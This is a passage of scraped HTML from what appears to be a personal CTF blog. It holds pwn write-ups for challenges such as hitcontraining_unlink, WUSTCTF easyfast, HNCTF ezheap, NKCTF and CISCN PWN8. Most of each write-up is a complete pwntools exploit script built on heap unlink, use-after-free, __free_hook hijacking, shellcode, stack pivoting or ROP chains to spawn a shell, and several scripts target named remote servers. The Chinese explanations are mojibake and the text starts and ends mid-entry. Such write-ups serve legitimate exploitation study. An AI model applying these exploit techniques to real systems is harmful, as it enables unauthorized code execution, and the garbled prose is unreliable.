add(0x80,b&amp;quot;qqq&amp;quot;)
add(0x40,b&amp;quot;www&amp;quot;)

payload=p64(0)+p64(0x30)
fd=bss_addr-0x18
bk=bss_addr-0x10
payload+=p64(fd)+p64(bk)
payload+=cyclic(0x10)
payload+=p64(0x30)+p64(0x90)



edit(0,len(payload),payload)

delete(1)


payload=p64(0)*2+p64(0)+p64(atoi_got)
edit(0,len(payload),payload)
gdb.attach(io)
pause()
show()
io.recvuntil(&amp;quot;0 : &amp;quot;)
libc_base=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;atoi&amp;quot;]
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))


sys_addr=libc_base+libc.sym[b&amp;quot;system&amp;quot;]
edit(0,8,p64(sys_addr))
io.sendafter(&amp;quot;choice:&amp;quot;,b&amp;quot;/bin/sh\x00&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é¦–å…ˆç”³è¯·3ä¸ªå †å—ï¼Œåˆ©ç”¨edit(0)é€šè¿‡chunk0ä¼ªé€ ä¸€ä¸ªfake_chunk,æ³¨æ„unlinkçš„æ£€æŸ¥æœºåˆ¶ï¼Œchunk1çš„sizeå’Œprev_sizeï¼ˆå³fake_chunk sizeï¼‰ä¸èƒ½é”™ï¼Œæ­¤å¤–æ³¨æ„chunk1çš„å¤§å°éœ€å¤§äºfastbinæœ€å¤§å€¼ï¼Œæ–¹ä¾¿åæ¥delete(1)æ—¶å’Œfake_chunkåˆå¹¶è§¦å‘unlinkæ“ä½œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(0x30)
fd=bss_addr-0x18
bk=bss_addr-0x10
payload+=p64(fd)+p64(bk)
payload+=cyclic(0x10)
payload+=p64(0x30)+p64(0x90)

edit(0,len(payload),payload)

delete(1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹‹åfake_chunkçš„fdæŒ‡é’ˆæŒ‡å‘äº†chunkæŒ‡é’ˆ-0x18å¤„&lt;br&gt;
å†æ¬¡é€šè¿‡editä¿®æ”¹chunkæŒ‡é’ˆå¤„çš„åœ°å€ä¸ºatoi_gotï¼ˆè°ƒç”¨è¿‡çš„å‡½æ•°gotåœ°å€éƒ½å¯ä»¥ï¼Œä¸è¿‡é‡‡ç”¨atoiæ–¹ä¾¿æœ€åä¼ å‚ï¼‰,æ–¹ä¾¿show()æ—¶æ³„éœ²libc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)*2+p64(0)+p64(atoi_got)
edit(0,len(payload),payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€åå°†atoiçš„gotè¡¨åœ°å€æ”¹ä¸ºsystemåœ°å€ï¼Œæ­¤æ—¶è°ƒç”¨atoiè¯»å…¥å‚æ•°æ—¶åŒæ—¶è°ƒç”¨äº†systemï¼Œå‚æ•°ä¼ å…¥systemï¼Œè‹¥ä¼ å…¥&amp;quot;sh&amp;quot;åˆ™å¯ä»¥getshell&lt;/p&gt;
">hitcontraining_unlink wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xswnbOk4E/"" data-c="
          &lt;p&gt;64ä½å¼€å¯canaryå’Œnxä¿æŠ¤ï¼Œæ ‡å‡†èœå•é…ç½®ï¼Œå­˜åœ¨uafæ¼æ´ï¼Œä¸”editæ—¶ä¸æ£€æŸ¥å½“å‰chunkæ˜¯å¦ä¸ºç©º&lt;br&gt;
æœ€å¼€å§‹æ€è·¯åˆ©ç”¨double freeæ”¹ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯addæœ‰é™åˆ¶ï¼Œä¸‹æ ‡ä¸è¶…è¿‡3ï¼Œæœ€å¤šåˆ›å»º4ä¸ªchunkï¼›&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680084324971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åªå¥½åˆ©ç”¨uafæ¼æ´ï¼Œå…ˆåˆ›å»ºchunk0é‡Šæ”¾åeditä¿®æ”¹fdæŒ‡é’ˆï¼Œåœ¨åˆ†é…ä¸¤æ¬¡chunkåˆ°fdæŒ‡é’ˆæŒ‡å‘æ ˆä¸Šçš„fake_chunkï¼Œæ­¤æ—¶edit(2)å³å¯æ›´æ”¹è¯¥fake_chunkå¤„çš„å†…å®¹&lt;br&gt;
å°†0x608090å¤„çš„1æ”¹ä¸º0å³å¯getshell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680085251262.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./[WUSTCTF 2020]easyfast&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28201)
elf=ELF(&amp;quot;./[WUSTCTF 2020]easyfast&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

shell=0x4008ab
key_ptr=0x602080

def alloc(n):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size&amp;gt;\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index&amp;gt;\n&amp;quot;, str(n))

def edit(n,c,cc):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index&amp;gt;\n&amp;quot;, str(n))
    io.send(cc)

def shell():
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;4&amp;quot;)


alloc(0x40) #0
delete(0)
payload=p64(key_ptr)

gdb.attach(io)
pause()

edit(0,len(payload),payload)
alloc(0x40) #1
alloc(0x40) #2
payload=p64(0)
edit(2,len(payload),p64(0))


# alloc(0x40) #0
# alloc(0x40) #1
# delete(0)
# delete(1) #main_arena-&amp;gt;0-&amp;gt;1-&amp;gt;0
# delete(0)

# gdb.attach(io)
# pause()

# alloc(0x40) #2
# alloc(0x40) #3

# payload=p64(key_ptr)
# edit(1,len(payload),payload)

# alloc(0x40) #4
# alloc(0x40) #5

shell()
# delete(1)
# alloc(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[WUSTCTF 2020]easyfast wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/C4txIB5QN/"" data-c="
          &lt;p&gt;64ä½å †æº¢å‡ºé¢˜ç›®ï¼Œä¿æŠ¤å…¨å¼€ï¼Œæœ¬é¢˜ç”¨åˆ°chunk extendä»¥åŠ__free_hookåŠ«æŒ&lt;br&gt;
menuå­˜åœ¨4ä¸ªå‡½æ•°ï¼Œå…¶ä¸­addå‡½æ•°ä¸­ä¸€æ¬¡mallocä¸¤ä¸ªå †å—&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002145102.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬ä¸€ä¸ªå †å—æ˜¯descriptionï¼Œç¬¬äºŒä¸ªå †å—æ‰æ˜¯real contentå­˜æ”¾å¤„&lt;br&gt;
è€Œæœ¬ä½“å †å—ç»“æ„ä½“ä¸­å­˜æ”¾putsçš„å®é™…åœ°å€ï¼Œå¯ä»¥ä»¥æ­¤æ³„éœ²åœ°å€è®¡ç®—libcåŸºå€&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002246302.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¸‹é¢æ˜¯expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./ezheap&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28232)
elf=ELF(&amp;quot;./ezheap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


def add(n,s,c,cc):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;1&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))
    io.recvuntil(b&amp;quot;Size:\n&amp;quot;)
    io.send(str(s))
    io.recvuntil(b&amp;quot;Name: \n&amp;quot;)
    io.send(c)
    io.recvuntil(b&amp;quot;Content:\n&amp;quot;)
    io.send(cc)

def delete(n):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;2&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))

def show(n):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;3&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))

def edit(n,s,c):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;4&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))
    io.recvuntil(b&amp;quot;Size:\n&amp;quot;)
    io.send(str(s))
    io.send(c)

add(0,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #0
add(1,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #1
# add(2,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;)

gdb.attach(io)
pause()

edit(0,0x70,cyclic(0x70))  #0x70bytesåˆ°putsçš„å†…å­˜åœ°å€

show(0) #overlapped chunk 0

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]

print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

payload=cyclic(0x40)+p64(0)+p64(0x31)+p64(0)*2+p64(free_hook-8)
edit(0,len(payload),payload)
payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr)
edit(1,len(payload),payload)
delete(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…ˆåˆ†é…ä¸¤å—ç¬¦åˆfastbinå¤§å°çš„å †å—ï¼Œé€šè¿‡editå‡½æ•°å †æº¢å‡ºè‡³putsåœ°å€å¤„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;add(0,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #0
add(1,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #1
edit(0,0x70,cyclic(0x70)) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1680002436746.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è·å–libcåè€ƒè™‘åŠ«æŒ__free_hookåˆ°systemå‡½æ•°å¤„&lt;br&gt;
äºæ˜¯å†æ¬¡ä½¿ç”¨å †æº¢å‡ºå°†ä¹‹å‰ç”³è¯·çš„å †å—1çš„descriptionå—å¤„çš„åç§»ä¸º0x10å¤„åœ°å€è¦†ç›–ä¸º(&amp;amp;__free_hook-0x8)ï¼Œå°†descriptionæœ«å°¾ï¼ˆå³åç§»ä¸º0x18å¤„ï¼‰æ ‡å¿—ä½èµ‹å€¼ä¸º1ï¼Œä»¥ä¾¿èƒ½å¤Ÿè¢«freeæ‰ï¼Œå¦‚ä¸‹åˆ¤æ–­&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002947889.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¹‹åedit(1)æ—¶å¯ä»¥ç›´æ¥ä»æ­¤å¤„å¼€å§‹è¦†ç›–ï¼Œå¹¶ä¸”&amp;amp;__free_hook-0x8å¤„è¦†ç›–ä¸º&lt;code&gt;/bin/sh\x00&lt;/code&gt;ï¼Œ&amp;amp;__free_hookå¤„è¦†ç›–ä¸ºsystemåœ°å€ï¼Œæœ€åfree(1)æ—¶ä¾¿å¯ä»¥getshell&lt;/p&gt;
">[HNCTF 2022 WEEK4]ezheap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xiJWhqm91/"" data-c="
          &lt;h4 id=&#34;shellcode&#34;&gt;shellcode&lt;/h4&gt;
&lt;p&gt;64ä½shellcodeé¢˜ç›®&lt;br&gt;
ä½¿ç”¨readè¯»å…¥ï¼Œå¹¶ç”¨strncpyå°†è¯»å…¥æ•°æ®å¤åˆ¶åˆ°bssæ®µä¸Šä¸€å¤„åç§»å¤„ï¼Œéšåæ‰§è¡Œè¯¥bssåœ°å€åŠ ä¸Š100ä»¥å†…éšæœºæ•°çš„åç§»çš„åœ°å€å¤„æŒ‡ä»¤(æ­¤é¢˜éšæœºæ•°æ— æ•ˆï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œbssåç§»å¤„)&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


while True:
    try:
        # io=process(&amp;quot;./pwn&amp;quot;)
        io=remote(&amp;quot;node.yuzhian.com.cn&amp;quot;,33905)
        io.recvuntil(b&amp;quot;5 min!\n&amp;quot;)
        shellcode=asm(shellcraft.sh())
        payload=cyclic(84)+shellcode.ljust(36,b&amp;quot;a&amp;quot;)+p64(0x4040d4)
        # gdb.attach(io)
        # pause()

        io.send(payload)

        io.interactive()

    except:
        io.close()
        continue
        
        

# pwnéƒ¨åˆ†é¢˜ç›®çš„ä¸´æ—¶é™æ€å¹³å°
# ctf.comentropy.cn
# comentropy.cn
# 8301 8302 8303 8304
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;story&#34;&gt;story&lt;/h4&gt;
&lt;p&gt;64ä½æ ˆè¿ç§»&lt;br&gt;
menuå­˜åœ¨4ä¸ªå‡½æ•°ï¼Œå‰ä¸‰ä¸ªå‡½æ•°å‘bssæ®µåˆ†åˆ«å†™å…¥8bytes&lt;br&gt;
ç¬¬å››ä¸ªå‡½æ•°åœ¨å‰ä¸‰ä¸ªå‡½æ•°éƒ½è¢«è°ƒç”¨åæ‰§è¡Œï¼Œé€šè¿‡read()è¯»å…¥0x20bytes&lt;br&gt;
å‰ä¸‰æ¬¡éšä¾¿è¯»å…¥ï¼Œæ­¤é¢˜å¯ä»¥é€šè¿‡ç¬¬å››æ¬¡å‡½æ•°æ‰§è¡Œæ—¶è¿›è¡Œä¸¤æ¬¡æ ˆè¿ç§»ä¹‹ååŠ«æŒrspå¯„å­˜å™¨ç„¶åæ„å»ºROPé“¾æ³„éœ²libcè¿”å›æ„é€ æˆ–è€…one_gadgetæ±‚è§£&lt;br&gt;
æ ˆè¿ç§»åç”±äºreadé•¿åº¦é™åˆ¶0x20ï¼Œæ‰€ä»¥éœ€è¦å°å¿ƒæ„å»ºROPé“¾&lt;br&gt;
å¦å¤–æ³¨æ„ä¸€ç‚¹ï¼Œæ­¤é¢˜éœ€ç•™æ„&lt;a href=&#34;http://blog.binpang.me/2019/07/12/stack-alignment/&#34;&gt;åå…­å­—èŠ‚å¯¹é½&lt;/a&gt;çš„é—®é¢˜ï¼Œå¦‚æœæœ€åå¡ä½äº†ä¸å¦¨ä¿®æ”¹ä¸€ä¸‹bssçš„åˆå§‹åœ°å€ï¼ˆå¡äº†2hçš„é”…&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./story&amp;quot;)
io=remote(&amp;quot;node.yuzhian.com.cn&amp;quot;,35198)
elf=ELF(&amp;quot;./story&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
heart=0x40136f
ret=0x40101a
bss_addr=0x4050A8+0x700
pop_rdi_ret=0x401573
read_text=0x401387
leave_ret=0x40139e
one_gadget=[0xe3afe,0xe3b01,0xe3b04]

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;comment?\n&amp;quot;)
# payload=p64(read_text)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;2&amp;quot;)
io.recvuntil(b&amp;quot;corment?\n&amp;quot;)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;3&amp;quot;)
io.recvuntil(b&amp;quot;corMenT?\n&amp;quot;)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;4&amp;quot;)
io.recvuntil(b&amp;quot;heart...\n&amp;quot;)




payload=cyclic(0xA)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0xA)+p64(bss_addr+0xA+0x8)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)



payload=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(heart)
io.send(payload)

libc_base=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x084420
sys_addr=libc_base+0x052290
str_bin_sh=libc_base+0x1b45bd
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))

shell=one_gadget[0]+libc_base
print(&amp;quot;shell:  &amp;quot;+hex(shell))


# gdb.attach(io)
# pause()

# payload=cyclic(0x12)+p64(shell)
# # payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
# io.send(payload)

io.recvuntil(b&amp;quot;heart...\n&amp;quot;)

payload=cyclic(0xA)+p64(bss_addr+0x200)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0xA)+p64(bss_addr+0xA+0x200)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)



payload=p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.send(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040139e : leave ; ret
# 0x000000000040156c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040156e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401570 : pop r14 ; pop r15 ; ret
# 0x0000000000401572 : pop r15 ; ret
# 0x000000000040156b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040156f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040118d : pop rbp ; ret
# 0x0000000000401573 : pop rdi ; ret
# 0x0000000000401571 : pop rsi ; pop r15 ; ret
# 0x000000000040156d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">NKCTF_2023 pwnéƒ¨åˆ†wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9c1-_YzDp/"" data-c="
          &lt;p&gt;é™æ€ç¼–è¯‘é¢˜ç›®ï¼Œ0x50åˆ°ret&lt;br&gt;
é’ˆå¯¹è¾“å…¥æ•°æ®å¼‚æˆ–0x66ï¼Œå†å¼‚æˆ–ä¸€æ¬¡å¤åŸ&lt;br&gt;
ropchainä¸€æŠŠæ¢­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from struct import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./p8&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28093)

io.recvuntil(b&amp;quot;Password: \n&amp;quot;)
def rop():
    p = b&#39;&#39;
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
    p += b&#39;/bin//sh&#39;
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
    p += p64(0x3b)
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall
    return p

tmp=rop()

payload=&#39;a&#39;*0x50

tt=&#39;&#39;

for i in tmp:
    tt+=chr(i^0x66)
payload+=tt
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2019åå—]PWN8 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4WTMScs9z/"" data-c="
          &lt;p&gt;æœ¬é¢˜64ä½ä¿æŠ¤å…¨å¼€ï¼Œè€ƒå¯Ÿfastbin attackå’Œunsorted bin leakã€chunk extendç­‰ç­‰ï¼Œæ³¨æ„éœ€è¦patchelf&lt;br&gt;
ä¸»å‡½æ•°ä¸­menuå¯ä»¥å¤§æ¦‚æ¦‚æ‹¬æ­¤é¢˜æ‰€ç”¨åˆ°å‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679552396568.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
1.allocateï¼š&lt;br&gt;
æŒ‰idxé¡ºåºåˆ†é…å †å—ï¼Œå…¶ä¸­å¯ä»¥è‡ªå·±æŒ‡å®šsizeï¼Œæœ€å¤§4096ï¼Œå¹¶ä¸”åˆ†é…æ—¶ä½¿ç”¨çš„æ—¶calloc()å‡½æ•°ï¼Œåˆ†é…åä¼šç»™contentèµ‹0&lt;br&gt;
2.fill:&lt;br&gt;
è‡ªå·±æŒ‡å®šsizeå’Œcontentï¼Œæ­¤å¤„å¯ä»¥é€ æˆå †æº¢å‡º&lt;br&gt;
3.free&lt;br&gt;
é‡Šæ”¾æŒ‡å®šidxçš„å †å—çš„å†…å®¹ï¼ŒæŒ‡é’ˆç½®é›¶ï¼Œæ•…ä¸å­˜åœ¨uaf&lt;br&gt;
4.dump&lt;br&gt;
æ‰“å°å‡ºæŒ‡å®šidxçš„å †å—çš„content&lt;br&gt;
æ•…å¯ä»¥è€ƒè™‘æ³„éœ²bin[0]åæ ¹æ®åç§»è®¡ç®—å‡ºlibcåŸºå€åˆ©ç”¨one_gadgetæ±‚è§£æ­¤é¢˜ï¼›&lt;br&gt;
å †ä¸Šæ³„éœ²ä½¿ç”¨çš„æ˜¯unsorted bin leakï¼Œunsorted binä½¿ç”¨åŒå‘é“¾è¡¨è¿›è¡Œç®¡ç†ï¼Œä½¿ç”¨fdå’ŒbkæŒ‡é’ˆï¼Œè¯´æ˜è§ctf-wiki&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679553089112.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679553188030.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
é¦–å…ˆæˆ‘ä»¬å¯ä»¥åˆ†é…4ä¸ªfast chunk(idx=0ã€1ã€2ã€3)ï¼Œ1ä¸ªsmall chunk(idx=4)&lt;br&gt;
å…ˆfreeæ‰chunk 1å’Œchunk 2&lt;br&gt;
æ­¤æ—¶&lt;code&gt;main_arena-&amp;gt;chunk 2-&amp;gt;chunk 1&amp;lt;-0x0&lt;/code&gt;&lt;br&gt;
åé€šè¿‡å †æº¢å‡ºå°†chunk 2çš„fdæŒ‡é’ˆè¦†ç›–ä¸ºchunk 4çš„åœ°å€ï¼Œä»¥ä¾¿åç»­dumpå‡ºleak_addr&lt;br&gt;
é€šè¿‡å †æº¢å‡ºå°†chunk 4çš„sizeä¿®æ”¹ç¬¦åˆfast binçš„å¤§å°&lt;br&gt;
æ¥ç€é€šè¿‡ä¸¤æ¬¡alloc(0x10)å°†chunk 2å’Œchunk 4é‡æ–°åˆ†é…å›å»ï¼Œæ­¤æ—¶chunk 2å’Œchunk 4æŒ‡å‘å†…å­˜ä¸­åŒä¸€å—åŒºåŸŸ&lt;br&gt;
ç„¶åæˆ‘ä»¬å†æ¬¡é€šè¿‡å †æº¢å‡ºå°†chunk 4çš„å †å—å¤§å°æ”¹å›å»ï¼Œæ”¹ä¸ºsmall chunkå¤§å°&lt;br&gt;
æ¥ç€æˆ‘ä»¬å†ç”³è¯·ä¸€å—small chunkï¼Œé˜²æ­¢free(4)åchunk 4å’Œtop chunkåˆå¹¶&lt;br&gt;
ç„¶åfree(4)åchunk 4è¢«åˆ’åˆ°unsorted binä¸­ï¼Œfdå’ŒbkæŒ‡å‘main_arenaçš„ä¸€å—åç§»åœ°å€å¤„(ä¸æ˜¯main_arenaåœ°å€)&lt;br&gt;
æ­¤æ—¶å¯ä»¥dumpå‡ºè¿™å—åç§»åœ°å€&lt;br&gt;
å¯ä»¥ç®—å‡ºè¯¥åœ°å€è·ç¦»main_arenaåç§»ä¸º0x58&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679557961646.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç„¶åæ ¹æ®malloc_trimä¸­main_arenaçš„åç§»ç®—å‡ºlibcçš„åŸºå€&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679559052671.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è·å–libcåŸºå€åæˆ‘ä»¬å¯ä»¥åŠ«æŒ__malloc_hook&lt;br&gt;
